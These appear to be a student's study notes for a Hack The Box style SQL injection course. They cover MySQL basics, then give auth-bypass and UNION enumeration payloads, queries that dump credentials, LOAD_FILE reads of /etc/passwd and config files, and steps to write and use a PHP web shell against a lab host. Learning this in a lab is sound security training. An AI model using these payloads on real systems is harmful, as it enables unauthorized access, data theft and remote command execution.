
The relationship between tables within a database is called a Schema.
NoSQL doesn't mean "no unique ID." It means the data doesn't have to follow the traditional relational table structure.
# MySQL

### General

| Command                                                      | Description                                                                                                                                                                                                             |
| ------------------------------------------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `mysql -u root -h docker.hackthebox.eu -P 3306 -p<password>` | login to mysql database, The `-p` flag should be passed empty, so we are prompted to enter the password and do not pass it directly on the command line since it could be stored in cleartext in the bash_history file. |
| `SHOW DATABASES`                                             | List available databases                                                                                                                                                                                                |
| `USE users`                                                  | Switch to database                                                                                                                                                                                                      |

### Tables

|Command|Description|
|---|---|
|`CREATE TABLE logins (id INT, ...)`|Add a new table|
|`SHOW TABLES`|List available tables in current database|
|`DESCRIBE logins`|Show table properties and columns|
|`INSERT INTO table_name VALUES (value_1,..)`|Add values to table|
|`INSERT INTO table_name(column2, ...) VALUES (column2_value, ..)`|Add values to specific columns in a table|
|`UPDATE table_name SET column1=newvalue1, ... WHERE <condition>`|Update table values|

### Columns

|Command|Description|
|---|---|
|`SELECT * FROM table_name`|Show all columns in a table|
|`SELECT column1, column2 FROM table_name`|Show specific columns in a table|
|`DROP TABLE logins`|Delete a table|
|`ALTER TABLE logins ADD newColumn INT`|Add new column|
|`ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn`|Rename column|
|`ALTER TABLE logins MODIFY oldColumn DATE`|Change column datatype|
|`ALTER TABLE logins DROP oldColumn`|Delete column|

### Output

| Command                                               | Description                                                                                                                                            |
| ----------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `SELECT * FROM logins ORDER BY column_1`              | Sort by column                                                                                                                                         |
| `SELECT * FROM logins ORDER BY column_1 DESC`         | Sort by column in descending order                                                                                                                     |
| `SELECT * FROM logins ORDER BY column_1 DESC, id ASC` | Sort by two-columns                                                                                                                                    |
| `SELECT * FROM logins LIMIT 2`                        | Only show first two results                                                                                                                            |
| `SELECT * FROM logins LIMIT 1, 2`                     | Only show first two results starting from index 2, OFFSET = how many to skip, LIMIT = how many to show, so LIMIT (offset, show)                        |
| `SELECT * FROM table_name WHERE <condition>`          | List results that meet a condition                                                                                                                     |
| `SELECT * FROM logins WHERE username LIKE 'admin%'`   | List results where the name is similar to a given string. Similarly, the `_` symbol is used to match exactly one character. `---` means 3 characters.  |
 
## MySQL Operator Precedence

| Operator                                                |                                                                        |
| ------------------------------------------------------- | ---------------------------------------------------------------------- |
| Division (`/`), Multiplication (`*`), and Modulus (`%`) |                                                                        |
| Addition (`+`) and Subtraction (`-`)                    |                                                                        |
| Comparison (`=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`)    |                                                                        |
| NOT (`!`),                                              | The **`NOT` operator** means "the condition must NOT be true." or `!=` |
| AND (`&&`)                                              |                                                                        |
| OR (`\|\|`)                                             |                                                                        |

# SQL Injection


**In-Band SQL Injection:** The output of the injected query is shown directly on the webpage, so the result can be read immediately. It has two types: **Union-Based** and **Error-Based**. In **Union-Based SQL Injection**, `UNION` is used to combine another query with the original query, and the result is displayed in a specific column on the page. In **Error-Based SQL Injection**, SQL/PHP errors are shown on the page, so an intentionally triggered error can reveal useful database information.

**Blind SQL Injection:** The query output is not shown directly on the webpage, so SQL logic is used to figure out the result indirectly, sometimes character by character. It has two types: **Boolean-Based** and **Time-Based**. In **Boolean-Based SQL Injection**, a condition is made either `TRUE` or `FALSE`, and the difference in the webpage's response reveals information. In **Time-Based SQL Injection**, a function such as `SLEEP()` is used to delay the response when a condition is `TRUE`; the response time tells whether the condition was true or false.

**Out-of-Band SQL Injection:** The output cannot be obtained from the webpage, so the injected query sends the result to an external location, such as a DNS server, where it can be retrieved separately.


For a sql injection example, the application might normally create:

```
SELECT * FROM logins WHERE username LIKE '%USER_INPUT%';
```

If the input is:

```
1'; DROP TABLE users;--
```

the application combines the input with its original query:

```
SELECT * FROM logins WHERE username LIKE '%1'; DROP TABLE users;--%';
```

Here, `USER_INPUT` was replaced by `1'; DROP TABLE users;--`, 

`'` closes the original SQL string, `;` ends the first SQL statement, and `DROP TABLE users;` becomes a new SQL statement. The `--` starts a SQL comment, so everything after it, including the application's remaining `%';`, is ignored.

Note: In some cases, we may have to use the URL encoded version of the payload. An example of this is when we put our payload directly in the URL 'i.e. HTTP GET request'.

## Payload

**While doing SQL injection, keep the SQL logic operators and their TRUTH TABLE equations in mind.**  
[Logic Gates (OR, AND, NOT, NOR, NAND, XOR, XNOR) Truth Table](https://mechtrician.com/logic-gates-or-and-not-nor-nand-xor-xnor-truth-table/) 

Such as:

For **OR-based SQL injection**, just remember that `OR` can make a condition **true**. The goal is to make the final `WHERE` condition return `TRUE` so the login succeeds. For example, `' OR '1'='1` means **“OR 1 equals 1”**, and since `1=1` is always true, the database can return a user even without knowing the correct password. If the username part makes the query fail, the `OR` can be added to the password field instead. So, while doing SQL injection, simply remember: **`AND` needs both sides to be true, but `OR` needs only one side to be true.**

**Auth Bypass**

| Payload            | Description                                     |
| ------------------ | ----------------------------------------------- |
| `admin' or '1'='1` | Basic Auth Bypass                               |
| `admin')--`        | Basic Auth Bypass  for conditions With comments |

## Section 9: Subverting Query Logic, Question 1:

use `tom' OR '1'='1`, wait that didnt work but logged in as admin though. for tom, `tom' OR '1'='1-- -`

 In SQL, using two dashes only is not enough to start a comment. So, there has to be an empty space after them, so the comment starts with (-- ), with a space at the end. This is sometimes URL encoded as (--+), as spaces in URLs are encoded as (+). To make it clear, we will add another (-) at the end (-- -), to show the use of a space character.

Tip: if you are inputting your payload in the URL within a browser, a (#) symbol is usually considered as a tag, not a comment, and will not be passed as part of the URL. In order to use (#) as a comment within a browser, we can use '%23', which is an URL encoded (#) symbol.

## Section 10: Using Comments, Question 1:

Suppose the original query is the below, and we need to bypass it to get the information for the 5th user ID.

```sql
SELECT * FROM logins WHERE username='admin' AND password='something';
```

Instead of `username='admin'` in that condition, we need to bypass it to get `id=5`. For that, we can use `OR` to make it true. As multiple operator conditions within this `WHERE` condition will be processed as:

```sql
WHERE (username='admin' OR id=5) AND password....
```

Use `' OR id=5)#` to close the username with `'`, make the `id=5` condition true, and comment out the rest with `#`.


# Section 11, 12: Union Clause

A `UNION` statement can only operate on `SELECT` statements with an equal number of columns. If there is no equal, we can fill a column with junk data to make them even to `UNION` them. When filling other columns with junk data, we must ensure that the data type matches the columns data type, otherwise the query will return an error. Such as:

`SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '`

The `products` table has two columns in the above example, so we have to `UNION` with two columns. If we only wanted to get one column 'e.g. `username`', we have to do `username, 2`, such that we have the same number of columns:

`SELECT * from products where product_id = '1' UNION SELECT username, 2 from passwords`

If we had more columns in the table of the original query, we have to add more numbers to create the remaining required columns. 

In the URL, by injecting a single quote `'`, you can see if you can cause an error, this may mean that the page is vulnerable to SQL injection.

### Union Injection

In the URL, we can start with `order by 1`, sort by the first column, and succeed, as the table must have at least one column. Then we will do `order by 2` and then `order by 3` until we reach a number that returns an error, or the page does not show any output,. If we failed at `order by 4`, this means the table has three columns, which is the number of columns we were able to sort by successfully. We need to determine which columns are printed to the page, to determine where to place our injection.

**We cannot place our injection at the beginning, or its output will not be printed.**

| Payload                                | Description                                                                                                                                                                 |
| -------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `' order by 1-- -`                     | Detect number of columns using order by                                                                                                                                     |
| `cn' UNION select 1,2,3-- -`           | Detect number of columns using Union injection                                                                                                                              |
| `cn' UNION select 1,@@version,3,4-- -` | Basic Union injection, the injection was placed on 2's place as previously 2 returned a column. 3, 4 also returned. You can also replace 3, 4 each and place the injection. |

# Section 13 - DB Enumeration

Before enumerating the database, we usually need to identify the type of DBMS we are dealing with. This is because each DBMS has different queries, and knowing what it is will help us know what queries to use. 
`INFORMATION_SCHEMA` contains metadata about databases, tables, and columns on the server, which is very useful during SQL injection.  
To access a table from another database, use `database.table`, for example: `SELECT * FROM my_database.users;`

A **general SQL query for getting database information from `INFORMATION_SCHEMA`** is:

```
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
```

It simply asks: What databases/schemas exist on this server?”

Similarly, **What tables or Column exist?**:

```
SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;
```



| Payload                                                                                                                     | Description                                                                |
| --------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------- |
| `UNION select username, 2, 3, 4 from passwords-- -`                                                                         | Union injection for 4 columns                                              |
| `SELECT SLEEP(5)`                                                                                                           | Fingerprint MySQL with query output                                        |
| `cn' UNION select 1,database(),2,3-- -`                                                                                     | Fingerprint MySQL with no output / Current database name                   |
| `cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -`                                                   | List all databases (placed on 2's place as previously 2 returned a column) |
| `cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='ilfreight'-- -`            | List all tables in a specific database                                     |
| `cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -` | List all columns in a specific table                                       |
| `cn' UNION select 1, username, password, 4 from dev.credentials-- -`                                                        | Dump data from a table in another database                                 |

### Privileges

| Payload                                                                                                                                    | Description                                          |
| ------------------------------------------------------------------------------------------------------------------------------------------ | ---------------------------------------------------- |
| `cn' UNION SELECT 1, user(), 3, 4-- -`                                                                                                     | Find current user                                    |
| `cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -`                                                               | Find if user has admin privileges                    |
| `cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -` | Find if all user privileges                          |


### Question Answer

cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4 -- -  
  
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4 -- -

Common things to check under `/var/www/html`:

- `config.php` → configuration, potentially database connection details
- `db.php` / `database.php` → database connection code
- `connection.php` → database connection code
- `index.php` → main application code
- `login.php` → login logic
- `search.php` → you already checked this
- `admin.php` → admin functionality
- `.env` → environment variables and possibly secrets
- `README` / `README.md` → application information
- `robots.txt` → paths the site may not want indexed


# Section 15 - Writing Files

To be able to write files to the back-end server using a MySQL database, we require three things:

1. User with `FILE` privilege enabled
2. MySQL global `secure_file_priv` variable not enabled
3. Write access to the location we want to write to on the back-end server.

| `cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -` | Find which directories can be accessed through MySQL |
| ------------------------------------------------------------------------------------------------------------------------------------------ | ---------------------------------------------------- |
 `MySQL` uses `/var/lib/mysql-files` as the default folder

### File Injection


| Step                                | Payload / Command                                                                                                                          | What it does                                                                | What to remember                                         |
| ----------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------------------------------------------------------- | -------------------------------------------------------- |
| **1. Read a local file**            | `cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -`                                                                                   | Reads `/etc/passwd` from the **database server** and displays its contents. | `LOAD_FILE()` → **read a file**                          |
| **2. Read application source code** | `cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -`                                                                      | Reads the PHP source code of `search.php`.                                  | Useful for understanding how the application works.      |
| **3. Check `secure_file_priv`**     | `cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -` | Checks whether MySQL restricts file operations to a specific directory.     | **Blank** → no `secure_file_priv` directory restriction. |
| **4. Test writing to a directory**  | `cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -`                                           | Attempts to create `proof.txt` on the **database server**.                  | No error shown→ the file was probably written.           |
| **5. Understand the result**        | `http://154.57.164.82:31381/proof.txt`                                                                                                     | Checks whether the web server can serve that file.                          | If context is shown, then it works.                      |
| **6. Write the PHP web shell**      | `cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -`                                  | Writes a PHP file that executes commands through the `0` parameter.         | The path must be **writable AND web-accessible**.        |
| **7. Access the shell**             | `http://154.57.164.82:31381/shell.php?0=ls-- -` or `0=ls%20/`                                                                              | Sends `ls` through the `0` parameter.                                       | `shell.php?0=ls` → execute `ls`.                         |


**Note:** 

t While trying to write our webshell in the /var/www/html we get permissioned denied. We are not allowed to create files in the root folder of the web application.

- **`/var/www`** → Just a normal folder on Linux.
- **`/var/www/html`** → Often configured as the **webroot**.
- **Webroot** → The folder the web server exposes so a browser can access its files.
- **Find the webroot:** Apache → `grep -R "DocumentRoot" /etc/apache2/` | Nginx → `grep -R "root " /etc/nginx/`

MySQL Server 
	↓ 
INTO OUTFILE 
	↓ 
Path must exist + MySQL must have permission

To write a web shell, we must know the base web directory for the web server (i.e. web root). One way to find it is to use `load_file` to read the server configuration, like Apache's configuration found at `/etc/apache2/apache2.conf`, Nginx's configuration at `/etc/nginx/nginx.conf`, or IIS configuration at `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`, or we can search online for other possible configuration locations. Furthermore, we may run a fuzzing scan and try to write files to different possible web roots, using [this wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or [this wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt). Finally, if none of the above works, we can use server errors displayed to us and try to find the web directory that way.

# Skills Assessment - SQL Injection Fundamentals

So for the skill assessment of this module,  i followed the below walkthrough..
**you need to bypass login through create account, capture the post in burpsuite and inject the invitation code. :)**


[Skills Assessment — SQL Injection Fundamentals [NEW Version] | by 0xlucien | Medium](https://medium.com/@0xlucien/skills-assessment-sql-injection-fundamentals-new-version-c65c99b0f6b1) 